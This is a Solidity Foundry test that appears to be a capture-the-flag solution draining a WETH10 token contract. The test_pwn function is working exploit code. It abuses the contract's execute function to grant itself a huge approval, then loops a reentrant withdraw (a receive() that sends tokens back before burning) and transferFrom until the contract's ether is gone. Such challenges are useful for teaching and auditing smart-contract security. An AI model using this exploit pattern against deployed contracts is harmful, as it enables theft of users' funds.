// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {WETH10} from "../../src/weth10/weth10.sol";


contract WETH10Challenge is Test {
  WETH10 immutable weth10;
  address immutable target;
  address immutable bob;

  bool ispwning;

  constructor() {
    address deployedAddress;
        
    bytes memory bytecode = abi.encodePacked(
        vm.getCode("weth10.sol:WETH10")
    );
    assembly {
        deployedAddress := create(0, add(bytecode, 0x20), mload(bytecode))
    }
    
    require(deployedAddress != address(0), "Deployment failed");

    weth10 = WETH10(payable(deployedAddress));
    bob = address(this);
    target = deployedAddress;
  }

  function setUp() public {
    vm.deal(address(weth10), 10 ether);
    vm.deal(bob, 1 ether);
  }

  function min(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a < b) {
      return a;
    }
    return b;
  }

  function test_pwn() external {
    // take 0-amount flash loan, approving many many tokens to the user
    weth10.execute(target, 0, abi.encodeWithSignature("approve(address,uint256)", [uint256(uint160(bob)), 9999 ether]));

    while (target.balance != 0) {
      // commence attack with min(yourBalance, targetBalance)
      uint256 amount = min(bob.balance, target.balance);

      // deposit WETH
      weth10.deposit{value: amount}();

      // withdraw WETH, will enter `receive`
      ispwning = true;
      weth10.withdrawAll();
      ispwning = false;

      // transferFrom back your WETH10
      weth10.transferFrom(target, bob, amount);

      // withdraw for real to get extra ETH for your WETH10
      weth10.withdrawAll();
      
    }
    console.log("pwned");
    console.log(address(this).balance);
    console.log(bob.balance);
  }

  receive() external payable {
    if (ispwning) {
      // send WETH10 back to the pool, before burning happens
      weth10.transfer(target, msg.value);
    }
  }
}